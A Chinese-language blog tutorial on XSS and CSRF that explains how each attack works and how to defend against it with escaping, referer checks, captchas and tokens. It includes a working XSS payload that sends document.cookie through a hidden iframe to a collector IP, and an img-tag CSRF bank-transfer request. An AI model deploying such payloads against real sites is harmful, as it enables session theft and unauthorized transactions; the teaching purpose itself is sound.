---
title: 前端安全：XSS与CSRF
date: 2017-09-15
tags: [http]
categories: http
---
>整理自:
[详解XSS与CSRF两种跨站攻击](http://www.zyy1217.com/2017/04/22/%E8%AF%A6%E8%A7%A3XSS%E4%B8%8ECSRF%E4%B8%A4%E7%A7%8D%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/)
[总结 XSS 与 CSRF 两种跨站攻击](https://segmentfault.com/a/1190000004623125)



## XSS跨站脚本（Cross-site scripting，通常简称为XSS）

### 原理

XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。

### 举例：

假设xx贴吧存在这个漏洞，我打开一个帖子回复：

```js
// 用<script type="text/javascript"></script>包起来
while (true) {
    alert('hello,xss');
}
```
然后这条回复就发出去啦，当其他用户点进这个帖子，这段代码就会被执行，然后一直alert，这就是最原始的脚本注入。

那XSS跨站脚本也很容易理解了，注入一个可以跨站的脚本即可：

```js
// 用 <script type="text/javascript"></script> 包起来放在评论中
(function(window, document) {
    // 构造泄露信息用的 URL
    var cookies = document.cookie;
    var xssURIBase = "http://192.168.123.123/myxss/";
    var xssURI = xssURIBase + window.encodeURI(cookies);
    // 建立隐藏 iframe 用于通讯
    var hideFrame = document.createElement("iframe");
    hideFrame.height = 0;
    hideFrame.width = 0;
    hideFrame.style.display = "none";
    hideFrame.src = xssURI;
    // 开工
    document.body.appendChild(hideFrame);
})(window, document);
```

这时候，用户点进帖子，这段代码开始运行，他们并不知道自己的信息（cookie）已经被iframe跨域的方式送到收集服务器上，然后我们就可以用cookie中的隐私信息做很多很多事情啦。

### 如何防御XSS攻击

我们知道AJAX技术所使用的XMLHttpRequest对象都被浏览器做了限制，只能访问当前域名下的 URL，所谓不能“跨域”问题。这种做法的初衷也是防范XSS，多多少少都起了一些作用，但不是总是有用，正如上面的注入代码，用iframe也一样可以达到相同的目的。甚至在愿意的情况下，我还能用iframe发起POST请求。当然，现在一些浏览器能够很智能地分析出部分 XSS 并予以拦截，例如新版的 Firefox、Chrome 都能这么做。但拦截不总是能成功，何况这个世界上还有大量根本不知道什么是浏览器的用户在用着可怕的IE6。从原则上将，我们也不应该把事关安全性的责任推脱给浏览器，所以防止XSS的根本之道还是过滤用户输入。用户输入总是不可信任的，这点对于 Web 开发者应该是常识。

正如上文所说，如果我们不需要用户输入HTML而只想让他们输入纯文本，那么把所有用户输入进行 HTML 转义输出是个不错的做法。

## CSRF跨站请求伪造（ross-site request forgery）

跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。

你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。

严格意义上来说，CSRF 不能分类为注入攻击，因为 CSRF 的实现途径远远不止 XSS 注入这一条。通过XSS来实现CSRF易如反掌，但对于设计不佳的网站，一条正常的链接都能造成 CSRF。

### 原理

![csrf.jpg](http://upload-images.jianshu.io/upload_images/4869616-3449f27f48a1a9c5.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：

1. 登录受信任网站A，并在本地生成Cookie。
2. 在不登出A的情况下，访问危险网站B。

### 举例

1. 你登录银行网站A，银行网站A违反了HTTP规范，使用GET请求更新资源。这就存在了csrf漏洞。
2. 你访问危险网站B，B中有一段代码
```js
<img src=http://www.mybank.com/Transfer.php?toBankId=11&money=1000>
```
3. 你发现你的账户少了1000元

为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源http://www.mybank.com/Transfer.php?toBankId=11&money=1000 ，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。

### 如何防御CSRF攻击

1. 通过 referer 判定来源页面
    referer是在HTTP Request Head里面的，也就是由请求的发送者决定的。如果我喜欢，可以给 referer任何值。当然这个做法并不是毫无作用，起码可以防小白。

2. 使用验证码
    在表单中增加一个随机的数字或字母验证码，通过强制用户和应用进行交互，来有效地遏制CSRF攻击。

3. token验证
    * 在 HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有token或者token内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。

    * token需要足够随机

    * 敏感的操作应该使用POST，而不是GET，以form表单的形式提交，可以避免token泄露。

4. 在 HTTP 头中自定义属性并验证
    这种方法也是使用 token 并进行验证，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到HTTP头中自定义的属性里。通过 XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把 token 值放入其中。这样解决了上种方法在请求中加入 token 的不便，同时，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心 token 会透过 Referer 泄露到其他网站中去。

    我的理解：WebB并没有获取你的cookie，而只是伪造用户发起http请求，浏览器自动带上cookie而已，token存放在cookie中，即使cookie发送至服务端，我们每一次接受请求验证的并不是cookie，而是header中的token，WebB就无能为力了。


## XSS与CSRF的区别

CSRF 和 XSS 根本是两个不同维度上的分类。XSS是实现CSRF的诸多途径中的一条，但绝对不是唯一的一条。一般习惯上把通过 XSS 来实现的 CSRF 称为 XSRF。

可以通过跨站脚本注入XSS获取用户的信息，获得用户信息过后可以做诸多的事情，但是CSRF只能模拟用户行为，

CSRF 的全称是“跨站请求伪造”，而 XSS 的全称是“跨站脚本”。看起来有点相似，它们都是属于跨站攻击——不攻击服务器端而攻击正常访问网站的用户，但前面说了，它们的攻击类型是不同维度上的分类。CSRF顾名思义，是伪造请求，冒充用户在站内的正常操作。我们知道，绝大多数网站是通过 cookie 等方式辨识用户身份（包括使用服务器端 Session 的网站，因为 Session ID 也是大多保存在cookie里面的），再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。






